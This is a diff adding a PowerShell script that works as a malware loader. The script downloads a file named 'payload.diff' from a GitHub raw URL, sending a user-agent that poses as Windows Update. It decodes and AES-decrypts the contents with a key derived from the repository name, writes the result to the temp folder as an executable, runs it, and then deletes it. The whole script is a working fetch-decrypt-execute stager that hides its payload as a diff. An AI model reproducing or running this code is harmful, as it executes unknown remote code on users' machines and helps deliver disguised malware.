@@ -1,0 +1,113 @@
+function Get-RepoKey {
+    param([string]$Url)
+    
+    Write-Host "`n[*] Parsing repository name from URL: $Url"
+    $UriParts = $Url -split '/'
+    if ($UriParts -contains 'raw.githubusercontent.com') {
+        $RepoIndex = [array]::IndexOf($UriParts, 'raw.githubusercontent.com') + 2
+        $RepoName = $UriParts[$RepoIndex]
+        Write-Host "[+] Detected repository name: $RepoName" -ForegroundColor Cyan
+    } else {
+        throw "Invalid GitHub URL format"
+    }
+    
+    $Hasher = [System.Security.Cryptography.SHA256]::Create()
+    [byte[]]$hash = $Hasher.ComputeHash([Text.Encoding]::UTF8.GetBytes($RepoName))
+    Write-Host "[*] Generated SHA256 key: $([BitConverter]::ToString($hash).Replace('-',''))"
+    $hash[0..15]
+}
+
+function Read-EncryptedDiff {
+    param([string]$Url)
+    
+    Write-Host "`n[*] Downloading .diff file from: $Url"
+    $WebClient = New-Object Net.WebClient
+    $WebClient.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT; Microsoft Windows Update)'
+    try {
+        $DiffContent = $WebClient.DownloadString($Url)
+        Write-Host "[+] Downloaded $($DiffContent.Length) characters"
+        
+        $Parts = $DiffContent -split "`n`n", 2
+        if ($Parts.Length -ne 2) {
+            throw "Invalid diff format - missing separator"
+        }
+        
+        Write-Host "[*] Header part: $($Parts[0].Substring(0, [Math]::Min(100, $Parts[0].Length)))..."
+        Write-Host "[*] Data part size: $($Parts[1].Length) characters"
+        
+        $decodedData = [Convert]::FromBase64String($Parts[1])
+        Write-Host "[+] Decoded base64 data: $($decodedData.Length) bytes"
+        return $decodedData
+    }
+    finally {
+        $WebClient.Dispose()
+    }
+}
+
+function Expand-AesData {
+    param([byte[]]$Data, [byte[]]$Key)
+    
+    Write-Host "`n[*] Decrypting data with AES-CBC (Key: $([BitConverter]::ToString($Key).Replace('-','')))"
+    Write-Host "[*] IV: $([BitConverter]::ToString($Data[0..15]).Replace('-',''))"
+    Write-Host "[*] Encrypted payload size: $($Data.Length - 16) bytes"
+
+    $Aes = [System.Security.Cryptography.Aes]::Create()
+    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $Aes.Key = $Key
+    $Aes.IV = $Data[0..15]
+    
+    $Ms = New-Object IO.MemoryStream
+    try {
+        $Cs = New-Object System.Security.Cryptography.CryptoStream(
+            $Ms,
+            $Aes.CreateDecryptor(),
+            [System.Security.Cryptography.CryptoStreamMode]::Write
+        )
+        $Cs.Write($Data, 16, $Data.Length - 16)
+        $Cs.FlushFinalBlock()
+        $result = $Ms.ToArray()
+        Write-Host "[+] Decryption successful. Decrypted size: $($result.Length) bytes"
+        return $result
+    }
+    catch {
+        Write-Host "[!] Decryption failed: $_" -ForegroundColor Red
+        throw
+    }
+    finally {
+        $Cs.Dispose()
+        $Ms.Dispose()
+        $Aes.Dispose()
+    }
+}
+
+# Main execution flow
+$DiffUrl = "https://raw.githubusercontent.com/notsimplestring/genius/refs/heads/main/payload.diff"
+
+try {
+    # Get decryption key and decrypt payload
+    $DecryptionKey = Get-RepoKey -Url $DiffUrl
+    $EncryptedData = Read-EncryptedDiff -Url $DiffUrl
+    $decryptedBytes = Expand-AesData -Data $EncryptedData -Key $DecryptionKey
+
+    # Create temporary file
+    $tempFile = Join-Path $env:TEMP "decrypted_app.exe"
+    [System.IO.File]::WriteAllBytes($tempFile, $decryptedBytes)
+    Write-Host "`n[+] Temporary file created: $tempFile" -ForegroundColor Green
+
+    # Execute decrypted program visibly
+    Write-Host "`n[*] Launching decrypted program..." -ForegroundColor Cyan
+    $process = Start-Process -FilePath $tempFile -Wait -PassThru -NoNewWindow
+    
+    # Optional: Cleanup temporary file after execution
+    if (Test-Path $tempFile) {
+        Remove-Item $tempFile -Force
+        Write-Host "[+] Temporary file cleaned up" -ForegroundColor Green
+    }
+    
+    Write-Host "`n[!] Process exited with code: $($process.ExitCode)" -ForegroundColor Yellow
+}
+catch {
+    Write-Host "`n[!] Critical error: $_" -ForegroundColor Red
+    exit 1
+}
